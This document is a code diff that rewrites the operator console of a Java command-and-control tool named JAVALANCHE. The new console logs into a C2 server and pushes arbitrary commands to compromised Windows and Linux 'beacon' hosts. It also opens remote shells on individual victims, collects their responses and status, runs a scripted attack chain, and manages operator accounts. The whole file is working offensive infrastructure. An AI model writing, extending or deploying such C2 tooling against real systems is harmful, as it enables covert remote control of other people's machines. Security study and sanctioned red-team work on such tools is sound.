@@ -1,39 +1,48 @@
-package Servers.C2;
+package Servers.CLI;
 
 import java.util.HashMap;
-import java.util.LinkedList;
+import java.util.Map;
 import java.util.Scanner;
-import java.util.Queue;
-import java.util.HashSet;
-import java.util.ArrayList;
-import java.util.Arrays;
-import java.io.Console;
+import java.util.TreeMap;
 
-public class C2ServerUserHandler implements Runnable{
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.util.HashSet;
+import java.io.Console;
+import java.util.Arrays;
+
+public class C2ServerCLI implements Runnable{
     // Strings used to make the console look cool
+    private String GREEN = "\u001B[32m";
     private String RED = "\u001B[31m";
     private String BLUE = "\u001B[34m";
     private String RESET = "\u001B[37m";
 
-    // Pointer back to the C2 Server
-    private C2Server C2server;
-
     // Scanner for the user to enter input
     private Scanner userInputScanner;
-
-    // This is a Hash Map of Long Range Beacons that are waiting for MFA.
-    // The Key is the IP Address of the Beacon, and the Value is it's status,
-    // "Waiting", "Approved", or "Denied"
-    private HashMap<String,String> beaconsWaitingForMFA;
 
     // The User's current Path in the CLI
     private String currentUserPath;
 
-    // Queue of messages to be printed to the CLI
-    private Queue<String> messageQueue;
+    // URL of the C2 Server
+    private String C2URL;
+
+    // set to true if testing (i.e. the c2 server will not have a valid certificate)
+    private boolean testing;
 
     // Console Used so that the User's input of passwords is masked
     private Console passwordInputConsole;
+
+    // Oauth bearer token
+    private String bearerToken;
+
+    // Number of messages read from the server
+    private int messagesRead;
+
+    // Current user username and password
+    private String username;
+    private String password;
 
     /**
      * Class to handle input from the user controlling the C2
@@ -41,52 +50,12 @@ public class C2ServerUserHandler implements Runnable{
      * 
      * @param server Pointer to the C2 Server
      */
-    protected C2ServerUserHandler(C2Server server){
-        this.C2server = server;
+    protected C2ServerCLI(){
         this.userInputScanner = new Scanner(System.in);
-        this.beaconsWaitingForMFA = new HashMap<>();
         this.currentUserPath = "";
-        this.messageQueue = new LinkedList<String>();
+        this.testing = false;
         this.passwordInputConsole = System.console();
-    }
-
-    /**
-     * This function authenticates new beacons. First, the Password Hash from the Beacon
-     * is compared to the password hash stored. If they match, then the user is prompted
-     * through the CLI to confirm the authentication.
-     * 
-     * @param enteredPasswordHash the hashed password from the Beacon Server
-     * @param IPAddress The IP Address of the Beacon attempting to connect
-     * @return Either 'Authentication Successful', 'Authentication Failed: Incorrect Password', 'Authentication 
-     * Failed: User Denied MFA Prompt', or 'Authentication Failed: Authentication Process could not be completed'
-     */
-    protected String authenticateToC2(String IPAddress){
-        beaconsWaitingForMFA.put(IPAddress, "Waiting");
-        try{
-            synchronized(beaconsWaitingForMFA){
-                beaconsWaitingForMFA.wait();
-                if(beaconsWaitingForMFA.get(IPAddress).equals("Approved")){
-                    beaconsWaitingForMFA.remove(IPAddress);
-                    return "Authentication Successful";
-                }else{
-                    beaconsWaitingForMFA.remove(IPAddress);
-                    return "Authentication Failed: User Denied MFA Prompt";
-                }
-            }
-            
-        }catch(InterruptedException e){
-            e.printStackTrace();
-        }
-        return "Authentication Failed: Authentication Process could not be completed";
-    }
-
-    /**
-     * Used by the C2 Server to output a message to the CLI for the Threat Actor to View
-     * 
-     * @param message Message to be displayed
-     */
-    protected void outputToCLI(String message){
-        messageQueue.add(message);
+        this.messagesRead = 0;
     }
 
     private void printJAVALANCHE(){
@@ -109,18 +78,6 @@ public class C2ServerUserHandler implements Runnable{
         System.out.println("oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo");
         System.out.println();
     }
-
-    // private void printHome(){
-    //     System.out.println(RESET);
-    //     System.out.println("      _..---^---.._         __    __                                                      ");
-    //     System.out.println("     /  /  /   \\ \\ \\       |  |  |  |                                   ");
-    //     System.out.println("    /__/__/_____\\_\\_\\      |  |  |  |   ______    _________    _______                       ");
-    //     System.out.println("   |   _ _           |     |  |__|  |  |  __  |  |  _   _  |  |  _____|              ");
-    //     System.out.println("   |  |_|_|    __    |     |   __   |  | |  | |  | | | | | |  | |____                         ");
-    //     System.out.println("   |  |_|_|   | .|   |     |  |  |  |  | |__| |  | | | | | |  | |_____                       ");
-    //     System.out.println("   |__________|__|___|     |__|  |__|  |______|  |_| |_| |_|  |_______|                                                      ");
-    //     System.out.println();
-    // }
 
     private void printCommand(){
         System.out.println(RESET);
@@ -155,6 +112,19 @@ public class C2ServerUserHandler implements Runnable{
         System.out.println("        // /     ` /       |  |  \\  \\     | |______    |  |   |  |  |  |   |  |   | |______    |______  |      |  |    ");
         System.out.println("       ||         /        |  |   \\  \\    | |______    |  |___| _|  |  |___|  |   | |______     ______| |      |  |           ");
         System.out.println("        \\\\_______/         |__|    \\__\\   |________|   |_______\\_\\  |_________|   |________|   |________|      |__|          ");
+        System.out.println();
+    }
+
+    private void printUser(){
+        System.out.println("         ___              ___      ");
+        System.out.println("        /   \\    ___     /   \\        __       __   _________   ________   _________    _________");
+        System.out.println("       |     |  /   \\   |     |      |  |     |  | |  _______| |  ______| |   ___   \\  |  _______|");
+        System.out.println("       _\\___/_ |     |  _\\___/_      |  |     |  | | |_______  | |______  |  |___)   | | |_______  ");
+        System.out.println("      /       \\_\\___/_ /       \\     |  |     |  | |______   | |  ______| |   ___   /  |______   |");
+        System.out.println("      |       /        \\        |     \\  \\___/  /   ______|  | | |______  |  |   \\  \\   ______|  |");
+        System.out.println("      |       |        |        |      \\_______/   |_________| |________| |__|    \\__\\ |_________|");
+        System.out.println("      |_______|        |________|  ");
+        System.out.println("              |________|");
         System.out.println();
     }
 
@@ -221,10 +191,58 @@ public class C2ServerUserHandler implements Runnable{
         if(userInput.equals("1") || userInput.equals("2")){
             System.out.print("Enter Command to be run >> ");
             String command = userInputScanner.nextLine();
-            C2server.distributeCommandToBeacons(scope, command);
+            HTTPSRequest.sendRequest(C2URL + "/command", getCommandJSON(scope, command), bearerToken, testing, this);
             currentUserPath = "Command " + OS;
         }
         System.out.println(RESET);
+    }
+
+    protected String formatClientStatus(Map<String, Object> clientStatus){
+        // Creating fire visually pleasing table of client status
+        String table = " ________________________________________________\n";
+        table += String.format("| %-20s | %-23s |\n", "IP", "Connection Status");
+        table += "|______________________|_________________________|\n";
+        Map<String, Object> sortedByKey = new TreeMap<>(clientStatus);
+        for (String ip : sortedByKey.keySet()) {
+            String status;
+            boolean status_bool;
+            if (clientStatus.get(ip).equals(true)) {
+                status = GREEN + "CONNECTED :D" + RESET;
+                status_bool = false;
+            } else {
+                status = RED + "DISCONNECTED D:" + RESET;
+                status_bool = true;
+            }
+            // If the status is disconnected
+            if (status_bool){
+                table += String.format("| %-20s | %-33s |\n", ip, status);
+            }
+            // If the status is connected
+            else {
+                table += String.format("| %-20s | %-33s |\n", ip, status);
+            }
+        }
+        table += "|______________________|_________________________|\n";
+        return table;
+    }
+
+    private boolean validateIPv4Address(String IPAddress){
+         String[] quads = IPAddress.split("\\.");
+         if(quads.length != 4){
+            return false;
+         }
+         for(String quad : quads){
+            if(!quad.equals("x")){
+                try{
+                    if(Integer.parseInt(quad) > 255 || Integer.parseInt(quad) < 0){
+                        return false;
+                    }
+                } catch (Exception e){
+                    return false;
+                }
+            }
+         }
+         return true;
     }
 
     /**
@@ -234,66 +252,40 @@ public class C2ServerUserHandler implements Runnable{
         System.out.println("Enter 'q' at any time to exit the shell and return to the main menu\n");
         String clientOS = "none";
         String clientIP = "";
+        String currentDirectory = "C:\\";
         while(clientOS.equals("none")){
             System.out.print("Enter IP address of Client >> ");
             clientIP = userInputScanner.nextLine().toLowerCase();
-            clientOS = C2server.getClientOS(clientIP);
             if(clientIP.equals("q")){
                 break;
+            }
+            if(validateIPv4Address(clientIP)){
+                System.out.println("Setting up Shell ... \n");
+
+                // Get messages from Server
+        
+                // Send pwd so that we can get the current directory
+                String currentDirectoryOutput = HTTPSRequest.sendRequest(C2URL + "/shell", getCommandJSON(clientIP, "pwd"), bearerToken, testing, this);
+
+                if(currentDirectoryOutput.contains("output")){
+                    currentDirectory = getCommandOutput(currentDirectoryOutput);
+                    if(currentDirectory.contains("C:\\")){
+                        try{
+                            currentDirectory = currentDirectory.split("\n")[2];
+                        } catch (ArrayIndexOutOfBoundsException e){
+                            e.printStackTrace();
+                        }
+                    }
+                    break;
+                } else {
+                    System.out.println("Error: " + getJSONError(currentDirectoryOutput));
+                }
             }
         }
         
         if(clientIP.equals("q")){
             currentUserPath = "";
         } else {
-            
-            System.out.println("Setting up Shell ... \n");
-
-            // Empty the Message Queue
-            synchronized(messageQueue){
-                while(!(messageQueue.isEmpty())){
-                    System.out.println(messageQueue.remove());
-                }
-            }
-
-            String currentDirectory;
-
-            // messages is used to store all client responses
-            ArrayList<String> messages;
-            int numMessagesRead;
-    
-            currentDirectory = "";
-            if(clientOS.equals("Windows")){
-                currentDirectory = "C:\\";
-            } else if(clientOS.equals("Linux")){
-                currentDirectory = "/";
-            }
-
-            // Determine how many responses the client already has
-            numMessagesRead = C2server.getClientResponses(clientIP).get(clientIP).size();
-
-            // Send pwd so that we can get the current directory
-            C2server.getShellResponse(clientIP, "pwd");
-
-            // Iterate through all messages we haven't read already, and see if there is a directory in any of them
-            messages = C2server.getClientResponses(clientIP).get(clientIP);
-            
-            for(int i = numMessagesRead; i < messages.size(); i++){
-                if(messages.get(i).contains("C:\\")){
-                    try{
-                        currentDirectory = messages.get(i).split("\n")[2];
-                    } catch (ArrayIndexOutOfBoundsException e){
-                        e.printStackTrace();
-                    }
-                    break;
-                }
-                else if(messages.get(i).contains("/")){
-                    currentDirectory = messages.get(i);
-                    break;
-                }
-            }
-            numMessagesRead = messages.size();
-
             String command;
             Boolean runCommand;
             String dir;
@@ -386,15 +378,11 @@ public class C2ServerUserHandler implements Runnable{
 
                         if(runCommand){
                             // Send the Command
-                            C2server.getShellResponse(clientIP, command);
-
-                            messages = C2server.getClientResponses(clientIP).get(clientIP);
-                            for(int i = numMessagesRead; i < messages.size(); i++){
-                                System.out.println();
-                                System.out.println(messages.get(i));
-                                System.out.println();
-                            }
-                            numMessagesRead = messages.size();
+                            String response = getCommandOutput(HTTPSRequest.sendRequest(C2URL + "/shell", getCommandJSON(clientIP, command), bearerToken, testing, this));
+                            
+                            System.out.println();
+                            System.out.println(response);
+                            System.out.println();
                         }
                     }
                 } catch (StringIndexOutOfBoundsException e){
@@ -404,55 +392,224 @@ public class C2ServerUserHandler implements Runnable{
         }
     }
 
-    private void waitForResponse() throws InterruptedException{
-        // Waiting for traffic
+    /**
+     * Prints all of the responses to messages, based on the scope
+     * @param scope - what responses should be returned by the C2 Server, ex. Windows, Linux, 192.168.1.1, 10.x.x.x, 192.168.x.10
+     */
+    private void printClientResponses(String scope){
+        JSONObject jo = new JSONObject();
+        String responses;
+        int count;
+        jo.put("scope", scope);
+        responses = HTTPSRequest.sendRequest(C2URL + "/responses", jo.toString(), bearerToken, testing, this);
+        JSONObject jsonResponses = new JSONObject(responses);
+        Map<String, Object> clientResponses = jsonResponses.toMap();
+        for(String ip : clientResponses.keySet()){
+            System.out.println(ip);
+            System.out.println();
+            JSONArray jsonArray = jsonResponses.getJSONArray(ip);
+            count = 1;
+            for(int i = 0; i < jsonArray.length(); i++){
+                System.out.println(count + ".");
+                System.out.println(jsonArray.get(i));
+                System.out.println();
+                count++;
+            }
+        }
+    }
+
+    /**
+     * Returns the correct JSON needed to have the C2 Server execute a command on the scope of the command
+     * 
+     * @param scope - scope that the command should be run on (ex. Windows, Linux, 192.168.1.1, 10.x.x.x)
+     * @param command - command that should be run
+     * @return - JSON formatted string
+     */
+    private static String getCommandJSON(String scope, String command){
+        JSONObject jo = new JSONObject();
+        jo.put("scope", scope);
+        jo.put("command", command);
+        return jo.toString();
+    }
+
+    /**
+     * Get the output of a command run on some clients
+     * 
+     * @param json - JSON formatted string returned by C2 Server
+     * @return - output of the command
+     */
+    private static String getCommandOutput(String json){
+        JSONObject jo = new JSONObject(json);
+        return jo.getString("output").toString();
+    }
+
+    /**
+     * Gets the error of a JOSN formatted string from the server
+     * 
+     * @param json - JSON formatted string returned from the C2 Server
+     * @return - error message
+     */
+    private static String getJSONError(String json){
+        JSONObject jo = new JSONObject(json);
+        return jo.getString("error").toString();
+    }
+
+    /**
+     * Reads all of the messages that the C2 Server has waiting. 
+     * Ex. 
+     * New Client at 192.168.1.1
+     * Lost Client at 10.0.0.1
+     * Lost Beacon Server at 192.168.1.10
+     */
+    private void readMessages(){
+        JSONObject jo = new JSONObject();
+        jo.put("Messages Read", messagesRead);
+        String newMessages = HTTPSRequest.sendRequest(C2URL + "/messages", jo.toString(), bearerToken, testing, this);
+        if(!newMessages.equals("[]")){
+            JSONArray ja = new JSONArray(newMessages);
+            System.out.println();
+            for(int i = 0; i < ja.length(); i++){
+                System.out.println(ja.get(i).toString());
+                messagesRead++;
+            }
+        }
+    }
+
+    /**
+     * Takes the current username and password, and re authenticates with the C2 Server. Typically used when the current bearer token has expired
+     * 
+     * @return new bearer token
+     */
+    protected String reAuthenticate(){
+        String serverAuthResponse = HTTPSRequest.sendAuthRequest(C2URL + "/auth", username, password, testing);
+        if(serverAuthResponse.contains("bearer")){
+            JSONObject authResponse = new JSONObject(serverAuthResponse);
+            this.bearerToken = authResponse.get("bearer").toString();
+            return authResponse.get("bearer").toString();
+        }
+        return "";
+    }
+
+
+    /**
+     * Prompts the user to enter new credentials, to get a new oauth bearer token
+     * 
+     * @return new bearer token
+     */
+    protected String reAuthenticateNewCreds(){
         System.out.println();
-        System.out.println("Waiting for response...");
-        Thread.sleep(3000);
+        System.out.println("Your username and password are no longer valid. Please enter in new credentials");
+        while(true){
+            System.out.print("Enter Server IP >> ");
+            String serverIPAddress = userInputScanner.nextLine();
+            C2URL = "https://" + serverIPAddress + ":8000";
+            System.out.print("Enter Username >> ");
+            String username = userInputScanner.nextLine();
+            String password = new String(passwordInputConsole.readPassword("Enter Password >> "));
+            String serverAuthResponse = HTTPSRequest.sendAuthRequest(C2URL + "/auth", username, password, testing);
+            if(serverAuthResponse.contains("bearer")){
+                JSONObject authResponse = new JSONObject(serverAuthResponse);
+                this.bearerToken = authResponse.get("bearer").toString();
+                this.username = username;
+                this.password = password;
+                return bearerToken;
+            } else {
+                System.out.println();
+                System.out.println(getJSONError(serverAuthResponse));
+                System.out.println();
+            }
+        }
+    }
+
+    /**
+     * User Menu used by the root user to add, remove, or change passwords of users who are allowed to access the CLI
+     * Only the root user has access to this menu (the backend API will only allow requests with bearer tokens that were granted to the root user)
+     */
+    private void users(){
+        printUser();
         System.out.println();
+        System.out.println("1. Create a new User");
+        System.out.println("2. Change a user's password");
+        System.out.println("3. Disable a user");
+        System.out.println("4. Back");
+        System.out.println();
+        System.out.print(" >> ");
+
+        String userSelection = userInputScanner.nextLine();
+        if(userSelection.equals("1")){
+            System.out.println();
+            System.out.print("Enter new User's Username >> ");
+            String newUsername = userInputScanner.nextLine();
+            String newPassword = new String(passwordInputConsole.readPassword("Enter new User's Password >> "));
+            JSONObject usernamePasswordJSON = new JSONObject();
+            usernamePasswordJSON.put("type", "add");
+            usernamePasswordJSON.put("username", newUsername);
+            usernamePasswordJSON.put("password", newPassword);
+            HTTPSRequest.sendRequest(C2URL + "/user", usernamePasswordJSON.toString(), bearerToken, testing, this);
+        } else if (userSelection.equals("2")){
+            System.out.println();
+            System.out.print("Enter Username >> ");
+            String newUsername = userInputScanner.nextLine();
+            String newPassword = new String(passwordInputConsole.readPassword("Enter User's new Password >> "));
+            JSONObject usernamePasswordJSON = new JSONObject();
+            usernamePasswordJSON.put("type", "add");
+            usernamePasswordJSON.put("username", newUsername);
+            usernamePasswordJSON.put("password", newPassword);
+            HTTPSRequest.sendRequest(C2URL + "/user", usernamePasswordJSON.toString(), bearerToken, testing, this);
+        } else if (userSelection.equals("3")){
+            System.out.println();
+            System.out.print("Enter Username to Disable >> ");
+            String newUsername = userInputScanner.nextLine();
+            JSONObject disableUsernameJSON = new JSONObject();
+            disableUsernameJSON.put("type", "disable");
+            disableUsernameJSON.put("username", newUsername);
+            HTTPSRequest.sendRequest(C2URL + "/user", disableUsernameJSON.toString(), bearerToken, testing, this);
+        } else if (userSelection.equals("4")) {
+            currentUserPath = "";
+        } else {
+            System.out.println("Invalid selection");
+        }
     }
 
     @Override
     public void run() {
-        // User enters password that will be used for authentication
-        String password1 = "";
-        String password2 = "a";
-        while(!(password1.equals(password2))){
-            password1 = new String(passwordInputConsole.readPassword("Enter root Password: "));
-            password2 = new String(passwordInputConsole.readPassword("Re-enter root Password: "));
-            if(!(password1.equals(password2))){
-                System.out.println("Passwords do not match");
+        while(true){
+            System.out.print("Enter Server IP >> ");
+            String serverIPAddress = userInputScanner.nextLine();
+            C2URL = "https://" + serverIPAddress + ":8000";
+            System.out.print("Enter Username >> ");
+            String username = userInputScanner.nextLine();
+            String password = new String(passwordInputConsole.readPassword("Enter Password >> "));
+            String serverAuthResponse = HTTPSRequest.sendAuthRequest(C2URL + "/auth", username, password, testing);
+            if(serverAuthResponse.contains("bearer")){
+                JSONObject authResponse = new JSONObject(serverAuthResponse);
+                this.bearerToken = authResponse.get("bearer").toString();
+                this.username = username;
+                this.password = password;
+                break;
+            } else {
+                System.out.println();
+                System.out.println(getJSONError(serverAuthResponse));
+                System.out.println();
             }
         }
-
-        // This password is stored as the root password in the C2 Server Password database
-        C2server.updateUsernamePassword("root", C2Server.hashPassword(password1));
-
         
+        // Initally, we want to get all of the inital messages, figure out how many of them there are,
+        // so we don't absolutely bombard the user when they initially open the cli
+        JSONObject jo = new JSONObject();
+        jo.put("Messages Read", messagesRead);
+        String newMessages = HTTPSRequest.sendRequest(C2URL + "/messages", jo.toString(), bearerToken, testing, this);
+        if(!newMessages.equals("[]")){
+            JSONArray ja = new JSONArray(newMessages);
+            messagesRead = ja.length();
+        }
+
         // Loop for the User to use the CLI
         String userInput = "";
         while(true){
-            // If there are any beacons waiting for MFA, prompt user if they should be allowed to connect.
-            synchronized(beaconsWaitingForMFA){
-                if(beaconsWaitingForMFA.size() > 0){
-                    for(String IPAddress : beaconsWaitingForMFA.keySet()){
-                        System.out.print("New Beacon Entered Password Correctly from " + IPAddress + ". Allow connection to C2 Server? (y/n) ");
-                        if(userInputScanner.nextLine().toLowerCase().equals("y")){
-                            beaconsWaitingForMFA.replace(IPAddress, "Waiting", "Approved");
-                        }else{
-                            beaconsWaitingForMFA.replace(IPAddress, "Waiting", "Denied");
-                        }
-                    }
-                    beaconsWaitingForMFA.notifyAll();
-                }
-            }
 
             // Print all messages waiting in the queue.
-            synchronized(messageQueue){
-                while(!(messageQueue.isEmpty())){
-                    System.out.println(messageQueue.remove());
-                }
-            }
+            readMessages();
             
             if(currentUserPath.equals("")){
                 printJAVALANCHE();
@@ -460,7 +617,12 @@ public class C2ServerUserHandler implements Runnable{
                 System.out.println("2. Enter a Shell");
                 System.out.println("3. Request Data from Clients");
                 System.out.println("4. Get Status from Clients");
-                System.out.println("5. Exit CLI / Close Servers");
+                if(username.equals("root")){
+                    System.out.println("5. Manage Users");
+                    System.out.println("6. Exit CLI");
+                } else {
+                    System.out.println("5. Exit CLI");
+                }
                 System.out.println();
                 System.out.print(currentUserPath + " >> ");
                 userInput = userInputScanner.nextLine();
@@ -473,16 +635,35 @@ public class C2ServerUserHandler implements Runnable{
                 } else if(userInput.equals("4")){
                     currentUserPath = "Status";
                 } else if(userInput.equals("5")){
-                    System.out.print("Confirm shutdown of Server [y/N] >> ");
+                    if(username.equals("root")){
+                        currentUserPath = "Users";
+                    } else {
+                        //System.out.print("Confirm shutdown of Server [y/N] >> ");
+                        System.out.print("Confirm Exit of CLI [y/N] >> ");
+                        String confirmation = userInputScanner.nextLine();
+                        if(confirmation.toLowerCase().equals("y")){
+                            //System.out.println(RED + "Closing Server..."+ RESET);
+                            System.out.println(RED + "Closing CLI ..."+ RESET);
+                            System.out.println();
+                            //C2server.stopServer();
+                            //C2server.broadcastToBeacons("quit");
+                            break;
+                        }
+                    }
+                    
+                } else if(userInput.equals("6") && username.equals("root")){
+                    System.out.print("Confirm Exit of CLI [y/N] >> ");
                     String confirmation = userInputScanner.nextLine();
                     if(confirmation.toLowerCase().equals("y")){
-                        System.out.println(RED + "Closing Server..."+ RESET);
+                        System.out.println(RED + "Closing CLI ..."+ RESET);
                         System.out.println();
-                        C2server.stopServer();
-                        C2server.broadcastToBeacons("quit");
+                        //C2server.stopServer();
+                        //C2server.broadcastToBeacons("quit");
                         break;
                     }
-                }  else {
+                }
+                
+                else {
                     System.out.println("Invalid Input");
                 }
             } else if(currentUserPath.equals("Command")){
@@ -510,6 +691,8 @@ public class C2ServerUserHandler implements Runnable{
                 sendCommand("Windows");
             } else if(currentUserPath.equals("Command Linux")){
                 sendCommand("Linux");
+            } else if(currentUserPath.equals("Users")){
+                users();
             } else if(currentUserPath.equals("AttackChain")){
                 // Menu
                 printAttackChain();
@@ -631,7 +814,7 @@ public class C2ServerUserHandler implements Runnable{
                     windowsCommands += "C:\\Windows\\System32\\wallpaper.ps1 -wallpaperURL " + photoURL;
 
 
-                }else if (userAttackChainChoice.equals("6")){
+                } else if (userAttackChainChoice.equals("6")){
                     currentUserPath = "";
                 } else {
                     System.out.println("Invalid Input");
@@ -643,10 +826,10 @@ public class C2ServerUserHandler implements Runnable{
                     // Send commands based on os/scope
                     if(target.equals("all")){
                         if(os.equals("windows") || os.equals("all")){
-                            C2server.distributeCommandToBeacons("Windows", windowsCommands);
+                            HTTPSRequest.sendRequest(C2URL + "/command", getCommandJSON("Windows", windowsCommands), bearerToken, testing, this);
                         }
                         if(os.equals("linux") || os.equals("all")){
-                            C2server.distributeCommandToBeacons("Linux", linuxCommands);
+                            HTTPSRequest.sendRequest(C2URL + "/command", getCommandJSON("Linux", linuxCommands), bearerToken, testing, this);
                         }
                     } else {
                         // Temporary fix to have the target match the protocl
@@ -656,9 +839,9 @@ public class C2ServerUserHandler implements Runnable{
                             target = "Linux";
                         }
                         if(os.equals("windows")){
-                            C2server.distributeCommandToBeacons(target, windowsCommands);
+                            HTTPSRequest.sendRequest(C2URL + "/command", getCommandJSON(target, windowsCommands), bearerToken, testing, this);
                         } else {
-                            C2server.distributeCommandToBeacons(target, linuxCommands);
+                            HTTPSRequest.sendRequest(C2URL + "/command", getCommandJSON(target, linuxCommands), bearerToken, testing, this);
                         }
                     }
                 }
@@ -674,44 +857,18 @@ public class C2ServerUserHandler implements Runnable{
                 System.out.print(currentUserPath + " >> ");
                 userInput = userInputScanner.nextLine();
 
-                // Request from all Windows Boxes
-                int count = 1;
                 if(userInput.equals("1")){
-                    HashMap<String, ArrayList<String>> clientResponses = C2server.getClientResponses("Windows");
-                    for(String ip : clientResponses.keySet()){
-                        System.out.println(ip);
-                        System.out.println();
-                        for(String response : clientResponses.get(ip)){
-                            System.out.println(count + ".");
-                            System.out.println(response);
-                            System.out.println();
-                            count++;
-                        }
-                    }
+                    printClientResponses("Windows");
                 // Request from all Linux Boxes
                 } else if (userInput.equals("2")){
-                    HashMap<String, ArrayList<String>> clientResponses = C2server.getClientResponses("Linux");
-                    for(String ip : clientResponses.keySet()){
-                        for(String response : clientResponses.get(ip)){
-                            System.out.println(count + ".");
-                            System.out.println(response);
-                            System.out.println();
-                            count++;
-                        }
-                    }
+                    printClientResponses("Linux");
                 // Request from single IP
                 } else if (userInput.equals("3")){
                     // Ask user for IP
                     System.out.print("Enter IP Address for desired request >> ");
                     String IPAddress = userInputScanner.nextLine();
-                    HashMap<String, ArrayList<String>> clientResponses = C2server.getClientResponses(IPAddress);
-                    for(String ip : clientResponses.keySet()){
-                        for(String response : clientResponses.get(ip)){
-                            System.out.println(count + ".");
-                            System.out.println(response);
-                            System.out.println();
-                            count++;
-                        }
+                    if(validateIPv4Address(IPAddress)){
+                        printClientResponses(IPAddress);
                     }
                 // Return to home menu
                 } else if (userInput.equals("4")){
@@ -722,16 +879,16 @@ public class C2ServerUserHandler implements Runnable{
 
             // Get Client Status Data
             } else if(currentUserPath.equals("Status")){
-                C2server.distributeCommandToBeacons("Windows", "whoami");
-                C2server.distributeCommandToBeacons("Linux", "whoami");
-                
-                try {
-                    waitForResponse();
-                } catch (InterruptedException e) {e.printStackTrace();}
-                System.out.println(C2server.formatClientStatus(C2server.getClientStatus()));
+                String statusRequest = HTTPSRequest.sendRequest(C2URL + "/status", null, bearerToken, testing, this);
+                System.out.println(formatClientStatus((new JSONObject(statusRequest).toMap())));
                 currentUserPath = "";
             }
         }
     }
-}
 
+    public static void main(String[] args) {
+        C2ServerCLI cli = new C2ServerCLI();
+        Thread cliThread = new Thread(cli);
+        cliThread.start();
+    }
+}
